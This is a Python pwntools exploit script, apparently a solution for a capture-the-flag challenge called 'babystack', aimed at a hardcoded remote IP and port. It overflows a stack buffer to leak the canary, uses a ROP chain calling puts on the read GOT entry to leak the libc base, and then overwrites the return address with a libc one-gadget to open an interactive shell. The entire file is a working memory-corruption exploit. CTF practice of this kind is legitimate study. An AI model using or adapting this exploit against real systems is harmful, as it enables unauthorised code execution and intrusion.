from pwn import * 
import sys
from time import sleep
context.log_level = "debug"
# context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context.terminal=["tmux","splitw","-h"]

def debug():
    # addr = int(raw_input("DEBUG: "), 16)
    # gdb.attach(io, "b *" + str(addr))
    raw_input()
    gdb.attach(io,"b *0x4009d8\nb *0x4009dd")
# io = process("./babystack")
io = remote("111.198.29.45",31559)
elf = ELF("./babystack")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# exe_addr = 0x3f2d6
exe_addr=0x45216
# if sys.argv[1] == "l":
    
# else:
#     io = remote("1c6a6fb.isec.anscen.cn", 1234)
#     elf = ELF("./babystack")
#     libc = ELF("./libc-2.23.so")
#     exe_addr = 0x45216

def getCanary():
    io.sendlineafter(">> ", "1")
    payload = cyclic(0x88)
    # debug()
    
    io.sendline(payload)
    
    io.sendlineafter(">> ", "2")
    sleep(1)
    io.recvuntil("\n")
    sleep(1)
    canary = u64("\x00" + io.recv(7))
    print hex(canary)
    pause()
    log.debug("leaked canary -> 0x%x" % canary)
    return canary

def getBase(canary):
    read_got = elf.got["read"]
    read_plt = elf.plt["read"]
    puts_plt = elf.plt["puts"]
    #  start_plt = elf.symbols["start"]
    #  start_plt = 0x400720
    start_plt = 0x400908
    pop_rdi_ret = 0x0000000000400a93
    pop_rsi_r15_ret = 0x0000000000400a91
    io.sendlineafter(">> ", "1")
    #  log.info("------------------")
    payload = cyclic(0x88) + p64(canary) * 2 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(start_plt)
    #  print len(payload)
    io.sendline(payload)
    io.sendlineafter(">> ", "3")
    #  debug()
    #  log.info("------------------")
    sleep(1)
    read_leaked = u64(io.recv(6).ljust(8, '\x00'))
    log.debug("read_leaked -> 0x%x" % read_leaked)
    read_libc = libc.symbols["read"]
    libc_base = read_leaked - read_libc
    log.debug("leaked libcBase -> 0x%x" % libc_base)
    return libc_base

def getShell(canary, libcBase):
    io.sendlineafter(">> ", "1")
    exeAddr = libcBase + exe_addr
    payload = cyclic(0x88) + p64(canary) * 2 + p64(exeAddr)
    io.sendline(payload)
    #  debug()
    io.sendlineafter(">> ", "3")

    io.interactive()
    io.close()

if __name__ == "__main__":
    canary = getCanary()
    libcBase = getBase(canary)
    canary = getCanary()
    getShell(canary, libcBase)